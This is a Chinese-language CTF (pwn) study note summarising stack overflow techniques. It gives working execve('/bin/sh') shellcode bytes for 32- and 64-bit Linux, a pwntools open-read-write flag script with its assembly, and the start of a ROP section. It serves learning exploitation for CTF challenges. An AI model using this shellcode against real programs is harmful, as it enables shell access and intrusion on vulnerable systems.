[toc]

## 栈溢出攻击总结

**备注**：陆陆续续也做了不少题目了，但是似乎缺乏一些系统性的总结，特别是在pwn这块，栈溢出的各种技巧有待持续加强。本篇首先总结一下栈溢出的一些方式。同时，也会把攻击脚本记录在这里，以便后续取用。

### 1.shellcode

**解释**：控制程序执行机器码指令

**使用条件**：可以控制EIP寄存器，程序关闭了NX保护或者某个可读可写段具有可执行权限。可以结合mprotect函数或者mmap函数执行攻击。

当程序关闭了NX保护，这个时候可以考虑shellcode，shellcode不一定是获取shell，也可以是ORW的shell，即为open(/flag)------read(3, addr, 0x30)------write(1, addr, 0x30)。

首先记录一些常用的shellcode，分别适用于32位和64位系统，更多shellcode可以访问[shellstorm](http://shell-storm.org/shellcode/)

```
shellcode---linux---execve(/bin/sh)
-----------------------------------------------------------------------------
i386, 长度23字节
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

amd64，长度29字节
shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
```

这里也放一下orw的shellcode，偶尔会遇到这种题。

```python
from pwn import *
# 这里的架构啥的都可以改
context.update(arch='i386', os='linux', endian='little')
shellcode = shellcraft.open('/home/orw/flag',0)
shellcode += shellcraft.read('eax','esp', 0x30)
shellcode += shellcraft.write(1, 'esp', 0x30)
print(asm(shellcode))

# 手写汇编
'''
/* push b'/home/orw/flag\x00' */
push 0x1010101
xor dword ptr [esp], 0x1016660
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f
mov ebx, esp
xor ecx, ecx
xor edx, edx
/* call open() */
push 5 /* 5 */
pop eax
int 0x80
/* read(fd='eax', buf='esp', nbytes=0x30) */
mov ebx, eax
mov ecx, esp
push 0x30
pop edx
/* call read() */
push 3 /* 3 */
pop eax
int 0x80
/* write(fd=1, buf='esp', n=0x30) */
push 1
pop ebx
mov ecx, esp
push 0x30
pop edx
/* call write() */
push 4 /* 4 */
pop eax
int 0x80
'''
```



### 2.ROP

**解释**：面向后门函数攻击

**使用条件**：存在栈溢出，可以覆盖到函数返回地址

当程序中才能在废弃代码段，如调用system(/bin/sh)之类的函数，可以作为后门函数，覆盖到EIP寄存器，控制程序执行流，获取shell。